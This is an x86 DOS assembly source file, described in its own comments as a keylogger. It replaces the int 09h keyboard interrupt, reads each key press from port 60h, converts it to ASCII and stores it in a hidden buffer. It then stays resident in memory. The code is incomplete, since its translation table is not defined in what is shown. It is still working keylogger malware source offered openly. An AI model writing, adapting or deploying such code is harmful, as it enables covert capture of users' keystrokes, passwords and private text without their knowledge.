; This is int 09h override for keyloger to get chars into buffer

;testing purposes
org 100h

KBD equ 060h

segment .code

_main:
  call install_debug_realtime
  call install_keyboard_handler

  mov dx, 00fffh
  mov ah, 31h
  mov al, 0h
  int 21h
 ret
install_keyboard_handler:
  pusha
  push ds
  push es
  ;blocking usage of interrupts
  cli
  ;initializing es to be 0 (int table is in 0th segment)
  xor ax, ax
  mov es, ax
  ;saving old value of offset
  mov ax, [es:09h*4]
  mov [old_int_09h_offset], ax
  ;saving old value of segment
  mov ax, [es:09h*4+2]
  mov [old_int_09h_segment], ax
  ;installing this interrupt
  ;offset
  mov ax, keyboard_handler
  mov [es:09h*4],ax
  ;segment is same as this code segment - com only
  mov [es:09h*4+2], cs
  mov cx, 200
  ;unblocking usage of interrupts
  sti
  pop es
  pop ds
  popa
  ret
   
keyboard_handler:
  pusha
  push ds
  push es
  ;setting ds to be able to use labels
  mov ax, cs
  mov ds, ax    
  
  ;get pressed letter or number to al
  in al, KBD
  
  ;filtering if pressed

  ;converting to ascii
  mov bx, xlat_lowercase_table
  ;if it is not press scancode then ignore it
  mov ah, al
  and ah, 080h
  jnz i_dont_want_it
  
  xlat
  or al, al
  jz i_dont_want_it
  ;sync
  ;call _printc
  cli  
  ;working on it
  ;taking info about buffer
  mov bx, buffer
  mov di, [buffer_size]
  ;putting key pressed ascii at end of the buffer
  mov [bx + di], al
  ;incrementing current buffer size
  inc di
  ;updating buffer size in memory
  mov [buffer_size], di
  sti
 i_dont_want_it: 
  ;chaining interrupts
  ;sending flags because I have iret waiting in old interrupt
  cli
  pushf
  call far word [old_int_09h]
  sti


  mov cx, [buffer_size]
  mov ax, ds
  mov es, ax
  mov di, buffer
 ; call _debugMemory
  pop es
  pop ds
  popa
  iret

;%include 'utils.asm'
%include 'debug.asm'

segment .data

old_int_09h:
old_int_09h_offset:  dw 0
old_int_09h_segment: dw 0
buffer_size: dw 0
buffer: times 255 db 0


